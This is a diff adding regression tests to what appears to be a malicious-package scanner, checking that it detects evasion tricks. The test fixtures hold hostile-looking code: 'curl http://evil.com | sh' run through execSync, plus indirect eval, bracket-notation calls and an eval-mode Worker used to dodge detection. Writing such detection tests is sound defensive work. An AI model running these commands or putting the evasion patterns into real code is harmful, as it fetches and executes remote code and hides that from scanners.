@@ -109,6 +109,75 @@ binding.spawn({ file: '/bin/sh', args: ['-c', 'id'] });
       cleanupTemp(tmp);
     }
   });
+
+  // --- Batch 2 regression anchors ---
+
+  await asyncTest('BYPASS-REG-B2: require("node:child_process").execSync — detected', async () => {
+    const tmp = makeTempPkg(`
+const cp = require('node:child_process');
+cp.execSync('curl http://evil.com | sh');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const detected = hasType(result, 'dangerous_exec');
+      assert(detected, 'require("node:child_process").execSync should be detected');
+    } finally {
+      cleanupTemp(tmp);
+    }
+  });
+
+  await asyncTest('BYPASS-REG-B2: cp["execSync"]("curl | sh") bracket notation — detected', async () => {
+    const tmp = makeTempPkg(`
+const cp = require('child_process');
+cp['execSync']('curl http://evil.com | sh');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const detected = result.threats.some(t => t.type === 'dangerous_exec');
+      assert(detected, 'cp["execSync"]("curl | sh") bracket notation should be detected');
+    } finally {
+      cleanupTemp(tmp);
+    }
+  });
+
+  await asyncTest('BYPASS-REG-B2: (false || eval)(code) — detected', async () => {
+    const tmp = makeTempPkg(`
+const code = "process.env.SECRET";
+(false || eval)(code);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const detected = hasType(result, 'dangerous_call_eval');
+      assert(detected, '(false || eval)() should be detected as dangerous_call_eval');
+    } finally {
+      cleanupTemp(tmp);
+    }
+  });
+
+  await asyncTest('BYPASS-REG-B2: const { SECRET_KEY } = process.env — detected', async () => {
+    const tmp = makeTempPkg(`const { SECRET_KEY } = process.env;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const detected = hasType(result, 'env_access');
+      assert(detected, 'const { SECRET_KEY } = process.env should be detected as env_access');
+    } finally {
+      cleanupTemp(tmp);
+    }
+  });
+
+  await asyncTest('BYPASS-REG-B2: new Worker(code, { eval: true }) — detected', async () => {
+    const tmp = makeTempPkg(`
+const { Worker } = require('worker_threads');
+new Worker('require("child_process").execSync("id")', { eval: true });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const detected = hasType(result, 'worker_thread_exec');
+      assert(detected, 'new Worker(code, {eval:true}) should be detected as worker_thread_exec');
+    } finally {
+      cleanupTemp(tmp);
+    }
+  });
 }
 
 module.exports = { runAstBypassRegressionTests };
